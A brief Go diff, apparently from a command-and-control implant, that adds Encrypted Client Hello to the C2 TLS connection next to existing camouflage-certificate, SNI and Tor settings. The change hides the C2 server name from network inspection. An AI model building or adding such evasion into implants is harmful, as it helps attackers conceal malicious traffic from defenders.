@@ -43,6 +43,10 @@ func InitConfig() (err error) {
 	transport.SetC2ServerName(RuntimeConfig.SNI)
 	transport.SetMeshCamouflageIdentity(RuntimeConfig.CamouflageCertOrg, RuntimeConfig.CamouflageCertCN)
 
+	// ECH for the C2 TLS connection: fetch the ECHConfigList from the domain's
+	// HTTPS RR over DoH. Disabled when ECHServerName is empty.
+	transport.SetECHConfig(RuntimeConfig.ECHServerName, RuntimeConfig.DoHServer)
+
 	// CC Address
 	def.CCAddress = RuntimeConfig.CCAddress
 	isTor := netutil.IsTor(def.CCAddress)
